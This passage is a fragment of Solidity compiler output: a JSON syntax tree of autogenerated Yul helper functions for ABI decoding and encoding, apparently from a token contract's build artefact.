15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"2391:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"2399:6:15","type":""},{"name":"value2","nodeType":"YulTypedName","src":"2407:6:15","type":""}],"src":"2314:619:15"},{"body":{"nodeType":"YulBlock","src":"3065:817:15","statements":[{"body":{"nodeType":"YulBlock","src":"3112:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"3114:77:15"},"nodeType":"YulFunctionCall","src":"3114:79:15"},"nodeType":"YulExpressionStatement","src":"3114:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"3086:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"3095:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"3082:3:15"},"nodeType":"YulFunctionCall","src":"3082:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"3107:3:15","type":"","value":"128"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"3078:3:15"},"nodeType":"YulFunctionCall","src":"3078:33:15"},"nodeType":"YulIf","src":"3075:120:15"},{"nodeType":"YulBlock","src":"3205:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"3220:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"3234:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"3224:6:15","type":""}]},{"nodeType":"YulAssignment","src":"3249:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"3284:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"3295:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3280:3:15"},"nodeType":"YulFunctionCall","src":"3280:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"3304:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"3259:20:15"},"nodeType":"YulFunctionCall","src":"3259:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"3249:6:15"}]}]},{"nodeType":"YulBlock","src":"3332:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"3347:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"3361:2:15","type":"","value":"32"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"3351:6:15","type":""}]},{"nodeType":"YulAssignment","src":"3377:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"3412:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"3423:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3408:3:15"},"nodeType":"YulFunctionCall","src":"3408:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"3432:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"3387:20:15"},"nodeType":"YulFunctionCall","src":"3387:53:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"3377:6:15"}]}]},{"nodeType":"YulBlock","src":"3460:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"3475:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"3489:2:15","type":"","value":"64"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"3479:6:15","type":""}]},{"nodeType":"YulAssignment","src":"3505:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"3540:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"3551:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3536:3:15"},"nodeType":"YulFunctionCall","src":"3536:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"3560:7:15"}],"functionName":{"name":"abi_decode_t_uint256","nodeType":"YulIdentifier","src":"3515:20:15"},"nodeType":"YulFunctionCall","src":"3515:53:15"},"variableNames":[{"name":"value2","nodeType":"YulIdentifier","src":"3505:6:15"}]}]},{"nodeType":"YulBlock","src":"3588:287:15","statements":[{"nodeType":"YulVariableDeclaration","src":"3603:46:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"3634:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"3645:2:15","type":"","value":"96"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3630:3:15"},"nodeType":"YulFunctionCall","src":"3630:18:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"3617:12:15"},"nodeType":"YulFunctionCall","src":"3617:32:15"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"3607:6:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"3696:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nodeType":"YulIdentifier","src":"3698:77:15"},"nodeType":"YulFunctionCall","src":"3698:79:15"},"nodeType":"YulExpressionStatement","src":"3698:79:15"}]},"condition":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"3668:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"3676:18:15","type":"","value":"0xffffffffffffffff"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"3665:2:15"},"nodeType":"YulFunctionCall","src":"3665:30:15"},"nodeType":"YulIf","src":"3662:117:15"},{"nodeType":"YulAssignment","src":"3793:72:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"3837:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"3848:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3833:3:15"},"nodeType":"YulFunctionCall","src":"3833:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"3857:7:15"}],"functionName":{"name":"abi_decode_t_bytes_memory_ptr","nodeType":"YulIdentifier","src":"3803:29:15"},"nodeType":"YulFunctionCall","src":"3803:62:15"},"variableNames":[{"name":"value3","nodeType":"YulIdentifier","src":"3793:6:15"}]}]}]},"name":"abi_decode_tuple_t_addresst_addresst_uint256t_bytes_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"3011:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"3022:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"3034:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"3042:6:15","type":""},{"name":"value2","nodeType":"YulTypedName","src":"3050:6:15","type":""},{"name":"value3","nodeType":"YulTypedName","src":"3058:6:15","type":""}],"src":"2939:943:15"},{"body":{"nodeType":"YulBlock","src":"3968:388:15","statements":[{"body":{"nodeType":"YulBlock","src":"4014:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"4016:77:15"},"nodeType":"YulFunctionCall","src":"4016:79:15"},"nodeType":"YulExpressionStatement","src":"4016:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"3989:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"3998:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"3985:3:15"},"nodeType":"YulFunctionCall","src":"3985:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"4010:2:15","type":"","value":"64"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"3981:3:15"},"nodeType":"YulFunctionCall","src":"3981:32:15"},"nodeType":"YulIf","src":"3978:119:15"},{"nodeType":"YulBlock","src":"4107:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"4122:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"4136:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"4126:6:15","type":""}]},{"nodeType":"YulAssignment","src":"4151:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"4186:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"4197:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"4182:3:15"},"nodeType":"YulFunctionCall","src":"4182:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"4206:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"4161:20:15"},"nodeType":"YulFunctionCall","src":"4161:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"4151:6:15"}]}]},{"nodeType":"YulBlock","src":"4234:115:15","statements":[{"nodeType":"YulVariableDeclaration","src":"4249:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"4263:2:15","type":"","value":"32"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"4253:6:15","type":""}]},{"nodeType":"YulAssignment","src":"4279:60:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"4311:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"4322:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"4307:3:15"},"nodeType":"YulFunctionCall","src":"4307:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"4331:7:15"}],"functionName":{"name":"abi_decode_t_bool","nodeType":"YulIdentifier","src":"4289:17:15"},"nodeType":"YulFunctionCall","src":"4289:50:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"4279:6:15"}]}]}]},"name":"abi_decode_tuple_t_addresst_bool","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"3930:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"3941:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"3953:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"3961:6:15","type":""}],"src":"3888:468:15"},{"body":{"nodeType":"YulBlock","src":"4445:391:15","statements":[{"body":{"nodeType":"YulBlock","src":"4491:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"4493:77:15"},"nodeType":"YulFunctionCall","src":"4493:79:15"},"nodeType":"YulExpressionStatement","src":"4493:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"4466:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"4475:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"4462:3:15"},"nodeType":"YulFunctionCall","src":"4462:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"4487:2:15","type":"","value":"64"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"4458:3:15"},"nodeType":"YulFunctionCall","src":"4458:32:15"},"nodeType":"YulIf","src":"4455:119:15"},{"nodeType":"YulBlock","src":"4584:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"4599:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"4613:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"4603:6:15","type":""}]},{"nodeType":"YulAssignment","src":"4628:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"4663:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"4674:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"4659:3:15"},"nodeType":"YulFunctionCall","src":"4659:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"4683:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"4638:20:15"},"nodeType":"YulFunctionCall","src":"4638:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"4628:6:15"}]}]},{"nodeType":"YulBlock","src":"4711:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"4726:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"4740:2:15","type":"","value":"32"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"4730:6:15","type":""}]},{"nodeType":"YulAssignment","src":"4756:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"4791:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"4802:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"4787:3:15"},"nodeType":"YulFunctionCall","src":"4787:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"4811:7:15"}],"functionName":{"name":"abi_decode_t_uint256","nodeType":"YulIdentifier","src":"4766:20:15"},"nodeType":"YulFunctionCall","src":"4766:53:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"4756:6:15"}]}]}]},"name":"abi_decode_tuple_t_addresst_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"4407:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"4418:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"4430:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"4438:6:15","type":""}],"src":"4362:474:15"},{"body":{"nodeType":"YulBlock","src":"4907:262:15","statements":[{"body":{"nodeType":"YulBlock","src":"4953:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"4955:77:15"},"nodeType":"YulFunctionCall","src":"4955:79:15"},"nodeType":"YulExpressionStatement","src":"4955:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"4928:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"4937:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"4924:3:15"},"nodeType":"YulFunctionCall","src":"4924:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"4949:2:15","type":"","value":"32"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"4920:3:15"},"nodeType":"YulFunctionCall","src":"4920:32:15"},"nodeType":"YulIf","src":"4917:119:15"},{"nodeType":"YulBlock","src":"5046:116:15","statements":[{"nodeType":"YulVariableDeclaration","src":"5061:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"5075:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"5065:6:15","type":""}]},{"nodeType":"YulAssignment","src":"5090:62:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5124:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"5135:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5120:3:15"},"nodeType":"YulFunctionCall","src":"5120:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"5144:7:15"}],"functionName":{"name":"abi_decode_t_bytes4","nodeType":"YulIdentifier","src":"5100:19:15"},"nodeType":"YulFunctionCall","src":"5100:52:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"5090:6:15"}]}]}]},"name":"abi_decode_tuple_t_bytes4","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"4877:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"4888:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"4900:6:15","type":""}],"src":"4842:327:15"},{"body":{"nodeType":"YulBlock","src":"5251:273:15","statements":[{"body":{"nodeType":"YulBlock","src":"5297:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"5299:77:15"},"nodeType":"YulFunctionCall","src":"5299:79:15"},"nodeType":"YulExpressionStatement","src":"5299:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"5272:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"5281:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"5268:3:15"},"nodeType":"YulFunctionCall","src":"5268:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"5293:2:15","type":"","value":"32"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"5264:3:15"},"nodeType":"YulFunctionCall","src":"5264:32:15"},"nodeType":"YulIf","src":"5261:119:15"},{"nodeType":"YulBlock","src":"5390:127:15","statements":[{"nodeType":"YulVariableDeclaration","src":"5405:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"5419:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"5409:6:15","type":""}]},{"nodeType":"YulAssignment","src":"5434:73:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5479:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"5490:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5475:3:15"},"nodeType":"YulFunctionCall","src":"5475:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"5499:7:15"}],"functionName":{"name":"abi_decode_t_bytes4_fromMemory","nodeType":"YulIdentifier","src":"5444:30:15"},"nodeType":"YulFunctionCall","src":"5444:63:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"5434:6:15"}]}]}]},"name":"abi_decode_tuple_t_bytes4_fromMemory","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"5221:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"5232:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"5244:6:15","type":""}],"src":"5175:349:15"},{"body":{"nodeType":"YulBlock","src":"5596:263:15","statements":[{"body":{"nodeType":"YulBlock","src":"5642:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"5644:77:15"},"nodeType":"YulFunctionCall","src":"5644:79:15"},"nodeType":"YulExpressionStatement","src":"5644:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"5617:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"5626:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"5613:3:15"},"nodeType":"YulFunctionCall","src":"5613:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"5638:2:15","type":"","value":"32"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"5609:3:15"},"nodeType":"YulFunctionCall","src":"5609:32:15"},"nodeType":"YulIf","src":"5606:119:15"},{"nodeType":"YulBlock","src":"5735:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"5750:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"5764:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"5754:6:15","type":""}]},{"nodeType":"YulAssignment","src":"5779:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5814:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"5825:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5810:3:15"},"nodeType":"YulFunctionCall","src":"5810:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"5834:7:15"}],"functionName":{"name":"abi_decode_t_uint256","nodeType":"YulIdentifier","src":"5789:20:15"},"nodeType":"YulFunctionCall","src":"5789:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"5779:6:15"}]}]}]},"name":"abi_decode_tuple_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"5566:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"5577:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"5589:6:15","type":""}],"src":"5530:329:15"},{"body":{"nodeType":"YulBlock","src":"5930:53:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"5947:3:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"5970:5:15"}],"functionName":{"name":"cleanup_t_address","nodeType":"YulIdentifier","src":"5952:17:15"},"nodeType":"YulFunctionCall","src":"5952:24:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"5940:6:15"},"nodeType":"YulFunctionCall","src":"5940:37:15"},"nodeType":"YulExpressionStatement","src":"5940:37:15"}]},"name":"abi_encode_t_address_to_t_address_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"5918:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"5925:3:15","type":""}],"src":"5865:118:15"},{"body":{"nodeType":"YulBlock","src":"6048:50:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"6065:3:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"6085:5:15"}],"functionName":{"name":"cleanup_t_bool","nodeType":"YulIdentifier","src":"6070:14:15"},"nodeType":"YulFunctionCall","src":"6070:21:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"6058:6:15"},"nodeType":"YulFunctionCall","src":"6058:34:15"},"nodeType":"YulExpressionStatement","src":"6058:34:15"}]},"name":"abi_encode_t_bool_to_t_bool_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"6036:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"6043:3:15","type":""}],"src":"5989:109:15"},{"body":{"nodeType":"YulBlock","src":"6194:270:15","statements":[{"nodeType":"YulVariableDeclaration","src":"6204:52:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"6250:5:15"}],"functionName":{"name":"array_length_t_bytes_memory_ptr","nodeType":"YulIdentifier","src":"6218:31:15"},"nodeType":"YulFunctionCall","src":"6218:38:15"},"variables":[{"name":"length","nodeType":"YulTypedName","src":"6208:6:15","type":""}]},{"nodeType":"YulAssignment","src":"6265:77:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"6330:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"6335:6:15"}],"functionName":{"name":"array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"6272:57:15"},"nodeType":"YulFunctionCall","src":"6272:70:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"6265:3:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"6377:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"6384:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"6373:3:15"},"nodeType":"YulFunctionCall","src":"6373:16:15"},{"name":"pos","nodeType":"YulIdentifier","src":"6391:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"6396:6:15"}],"functionName":{"name":"copy_memory_to_memory","nodeType":"YulIdentifier","src":"6351:21:15"},"nodeType":"YulFunctionCall","src":"6351:52:15"},"nodeType":"YulExpressionStatement","src":"6351:52:15"},{"nodeType":"YulAssignment","src":"6412:46:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"6423:3:15"},{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"6450:6:15"}],"functionName":{"name":"round_up_to_mul_of_32","nodeType":"YulIdentifier","src":"6428:21:15"},"nodeType":"YulFunctionCall","src":"6428:29:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"6419:3:15"},"nodeType":"YulFunctionCall","src":"6419:39:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"6412:3:15"}]}]},"name":"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"6175:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"6182:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"6190:3:15","type":""}],"src":"6104:360:15"},{"body":{"nodeType":"YulBlock","src":"6562:272:15","statements":[{"nodeType":"YulVariableDeclaration","src":"6572:53:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"6619:5:15"}],"functionName":{"name":"array_length_t_string_memory_ptr","nodeType":"YulIdentifier","src":"6586:32:15"},"nodeType":"YulFunctionCall","src":"6586:39:15"},"variables":[{"name":"length","nodeType":"YulTypedName","src":"6576:6:15","type":""}]},{"nodeType":"YulAssignment","src":"6634:78:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"6700:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"6705:6:15"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"6641:58:15"},"nodeType":"YulFunctionCall","src":"6641:71:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"6634:3:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"6747:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"6754:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"6743:3:15"},"nodeType":"YulFunctionCall","src":"6743:16:15"},{"name":"pos","nodeType":"YulIdentifier","src":"6761:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"6766:6:15"}],"functionName":{"name":"copy_memory_to_memory","nodeType":"YulIdentifier","src":"6721:21:15"},"nodeType":"YulFunctionCall","src":"6721:52:15"},"nodeType":"YulExpressionStatement","src":"6721:52:15"},{"nodeType":"YulAssignment","src":"6782:46:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"6793:3:15"},{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"6820:6:15"}],"functionName":{"name":"round_up_to_mul_of_32","nodeType":"YulIdentifier","src":"6798:21:15"},"nodeType":"YulFunctionCall","src":"6798:29:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"6789:3:15"},"nodeType":"YulFunctionCall","src":"6789:39:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"6782:3:15"}]}]},"name":"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"6543:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"6550:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"6558:3:15","type":""}],"src":"6470:364:15"},{"body":{"nodeType":"YulBlock","src":"6986:220:15","statements":[{"nodeType":"YulAssignment","src":"6996:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7062:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"7067:2:15","type":"","value":"45"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"7003:58:15"},"nodeType":"YulFunctionCall","src":"7003:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"6996:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7168:3:15"}],"functionName":{"name":"store_literal_in_memory_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af","nodeType":"YulIdentifier","src":"7079:88:15"},"nodeType":"YulFunctionCall","src":"7079:93:15"},"nodeType":"YulExpressionStatement","src":"7079:93:15"},{"nodeType":"YulAssignment","src":"7181:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7192:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"7197:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"7188:3:15"},"nodeType":"YulFunctionCall","src":"7188:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"7181:3:15"}]}]},"name":"abi_encode_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"6974:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"6982:3:15","type":""}],"src":"6840:366:15"},{"body":{"nodeType":"YulBlock","src":"7358:220:15","statements":[{"nodeType":"YulAssignment","src":"7368:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7434:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"7439:2:15","type":"","value":"50"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"7375:58:15"},"nodeType":"YulFunctionCall","src":"7375:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"7368:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7540:3:15"}],"functionName":{"name":"store_literal_in_memory_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e","nodeType":"YulIdentifier","src":"7451:88:15"},"nodeType":"YulFunctionCall","src":"7451:93:15"},"nodeType":"YulExpressionStatement","src":"7451:93:15"},{"nodeType":"YulAssignment","src":"7553:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7564:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"7569:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"7560:3:15"},"nodeType":"YulFunctionCall","src":"7560:12:15"},"variableNames":[